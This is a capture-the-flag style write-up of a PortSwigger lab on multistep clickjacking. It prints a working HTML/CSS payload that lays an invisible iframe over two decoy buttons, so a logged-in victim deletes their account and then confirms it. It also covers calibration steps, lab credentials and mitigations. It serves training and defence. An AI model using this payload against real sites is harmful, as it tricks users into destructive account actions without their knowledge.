# 📘 PortSwigger Lab: Multistep clickjacking

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/learning-paths/clickjacking/multistep-clickjacking/clickjacking/lab-multistep
> 🎯 Topic: Clickjacking (UI redressing) — Multistep Clickjacking
> 🧪 Difficulty: Practitioner
> ✅ Status: Solved

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [📡 Why Confirmation Dialogs Fail](#dialogs)
- [⚡ The Multistep Mechanism](#iframe)
- [🔍 Step 1 — Observe the Target Behavior](#step1)
- [🔍 Step 2 — Construct the Base Exploit Payload](#step2)
- [🔍 Step 3 — Calibrate the First Action](#step3)
- [🔍 Step 4 — Calibrate the Second Action (Confirmation)](#step4)
- [🔍 Step 5 — Deliver Exploit to Victim](#step5)
- [📨 Example HTML Payload](#examples)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Use UI redressing techniques to perform a multi-step action:

```text
1. Construct an HTML page that frames the target application.
2. Trick a logged-in user into clicking a first decoy button ("Click me first") to trigger an account deletion request.
3. Trick the user into clicking a second decoy button ("Click me next") to hit the "Yes" confirmation button on the modal dialog.
4. Bypass the application's CSRF token and confirmation dialog protections.
```

<a id="theory"></a>

## 🧠 Short Theory
Developers often assume that adding a confirmation dialog (e.g., "Are you sure you want to delete your account?") will protect critical actions from CSRF and Clickjacking. However, **Multistep Clickjacking** proves this assumption wrong.

If an attacker can trick a user into clicking once, they can trick them into clicking twice. By using multiple strategically placed decoy elements (`div` tags) and choreographing the user's interactions, an attacker can guide the victim through complex, multi-step workflows.

<a id="idea"></a>

## 🧩 Core Idea
The attack relies on precisely aligning two decoy elements with two functional buttons in the hidden iframe.

```text
Attacker site:      Renders "Click me first" and "Click me next" buttons.
Hidden iframe:      Loads the account settings page.
Click 1:            Victim clicks "Click me first", hitting the invisible "Delete account" button.
Dialog Appears:     The target application opens a "Yes/No" confirmation modal inside the hidden iframe.
Click 2:            Victim clicks "Click me next", hitting the newly appeared, invisible "Yes" button.
Target server:      Deletes the account ✅
```

<a id="dialogs"></a>

## 📡 Why Confirmation Dialogs Fail
Confirmation dialogs are designed to prevent accidental clicks, not malicious framing. Because the dialog is rendered predictably within the application's DOM, its dimensions and button locations are static. This predictability allows an attacker to perfectly map the coordinates of the "Yes" button beforehand.

<a id="iframe"></a>

## ⚡ The Multistep Mechanism
The attacker uses standard clickjacking CSS, but instead of one decoy, they create multiple overlapping classes:

```text
- opacity: 0.0001 (Hides the entire iframe, including the subsequent modals).
- z-index: 2 (Places the iframe above the decoy elements).
- .firstClick, .secondClick (Separate CSS classes to independently control the top/left positioning of each decoy).
```

<a id="step1"></a>

## 🔍 Step 1 — Observe the Target Behavior
Log in to the vulnerable application (`wiener:peter`).

Navigate to `/my-account`. Click the "Delete account" button and observe the modal dialog that appears. Note the position of the "Yes" button. Click "No" to cancel.

<a id="step2"></a>

## 🔍 Step 2 — Construct the Base Exploit Payload
Open the Exploit Server. Insert the HTML structure with two decoy elements (`.firstClick` and `.secondClick`).

```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    .firstClick {
        position:absolute;
        top:330px;
        left:50px;
        z-index: 1;
    }
    .secondClick {
        position:absolute;
        top:285px;
        left:225px;
        z-index: 1;
    }
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="https://LAB-ID.web-security-academy.net/my-account"></iframe>
```

<a id="step3"></a>

## 🔍 Step 3 — Calibrate the First Action
Set the iframe `opacity` to `0.1`.

Click **Store** and then **View exploit**. Adjust the `top` and `left` pixel values for `.firstClick` until "Test me first" is perfectly centered underneath the **"Delete account"** button.

<a id="step4"></a>

## 🔍 Step 4 — Calibrate the Second Action (Confirmation)
While on the "View exploit" page, click the semi-transparent "Delete account" button (via your "Test me first" decoy) to trigger the confirmation dialog.

Now, adjust the `top` and `left` values for `.secondClick` until "Test me next" perfectly aligns underneath the **"Yes"** button on the confirmation modal.

<a id="step5"></a>

## 🔍 Step 5 — Deliver Exploit to Victim
Once both steps are perfectly aligned, finalize the payload:

- Change "Test me first" to "Click me first".
- Change "Test me next" to "Click me next".
- Change the iframe `opacity` from `0.1` to `0.0001`.

Click **Store** and then **Deliver exploit to victim**.

<a id="examples"></a>

## 📨 Example HTML Payload
Exploit Payload (Exploit Server Body)
```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    .firstClick {
        position:absolute;
        top:330px;
        left:50px;
        z-index: 1;
    }
    .secondClick {
        position:absolute;
        top:285px;
        left:225px;
        z-index: 1;
    }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

<a id="response"></a>

## 📥 Example Result
Victim Interaction (Silent Success)
```text
1. Victim loads the Exploit Server URL.
2. Victim sees "Click me first" and clicks it.
3. The click hits the invisible "Delete account" button, opening the hidden confirmation modal.
4. Victim is then drawn to "Click me next" and clicks it.
5. The second click hits the invisible "Yes" button.
6. The account is deleted without the victim ever seeing the application interface.
```

Lab status:

```text
Solved
```

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain
```text
1. Identify a multi-step critical action (Deletion -> Confirmation).
2. Create an HTML payload with multiple decoy div elements.
3. Align the first decoy under the primary action button.
4. Interact with the transparent iframe to reveal the second step.
5. Align the second decoy under the confirmation button.
6. Set opacity to 0.0001 to make the sequence invisible.
7. Deliver the hosted HTML payload to the victim.
8. Victim clicks through the sequence, successfully completing the attack.
```

<a id="breakdown"></a>

## 🔬 Why the Attack Worked
1. Lack of Framing Protections
No `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` headers were present.

2. Predictable UI Flow
The modal dialog spawned at exact, predictable pixel coordinates, allowing the attacker to map the second click reliably.

3. Ineffective Protection
The developer mistakenly believed that adding a CSRF token and a confirmation dialog would mitigate unauthorized actions. Clickjacking inherently bypasses both.

<a id="pentester"></a>

## 🧠 Pentester Mindset
When testing web applications:

```text
Never assume a two-step process (like a shopping cart checkout or deletion confirmation) is immune to clickjacking.
If the UI elements are predictably positioned, an attacker can chain an arbitrary number of clicks.
```

<a id="mistakes"></a>

## ❌ Common Mistakes
Mistake 1. Clicking too fast during testing
If you click the "Yes" button while calibrating `.secondClick`, you will delete your own test account and will have to reset the lab.

Mistake 2. Variable Screen Sizes
In a real-world scenario, if the target application uses responsive design (CSS Flexbox/Grid) where modal positions change based on screen size, the multistep attack becomes much harder to pull off reliably across different devices. (In this lab, the layout is static).

<a id="defense"></a>

## 🛡 Mitigation
1. Prevent Framing (Defeats the Clickjacking)
Implement `Content-Security-Policy: frame-ancestors 'none';` or `X-Frame-Options: DENY`. This is the only robust solution.

2. Out-of-Band Confirmation
Instead of a simple "Yes/No" modal, require out-of-band confirmation (e.g., clicking a link sent to an email, or entering a 2FA token) for destructive actions.

3. Frame Busting (Not Recommended)
Do not rely on JS frame busters or simple confirmation modals as a primary defense.

<a id="checklist"></a>

## ✅ Checklist
Reconnaissance
- [ ] Logged in to the application
- [ ] Mapped the multi-step flow (Delete -> Yes)
Payload Generation
- [ ] Created iframe with `.firstClick` and `.secondClick` elements
- [ ] Aligned `.firstClick` exactly beneath "Delete account"
Execution & Verification
- [ ] Triggered the modal in the semi-transparent view
- [ ] Aligned `.secondClick` exactly beneath "Yes"
- [ ] Changed text to "Click me first" and "Click me next"
- [ ] Changed opacity to `0.0001`
- [ ] Delivered exploit to victim
- [ ] Lab status: Solved

<a id="conclusion"></a>

## 🧾 Conclusion
The lab demonstrated that multi-step workflows do not protect against clickjacking:

```text
1. Proved that confirmation dialogs are ineffective if the site can be framed.
2. Successfully orchestrated a multi-click attack using predictable UI positioning.
```

Main lessons:
```text
- Attackers can choreograph complex user interactions through invisible UI redressing.
- Defense-in-depth requires actual re-authentication or robust anti-framing headers, not just extra clicks.
```
[⬆ Back to top](#top)
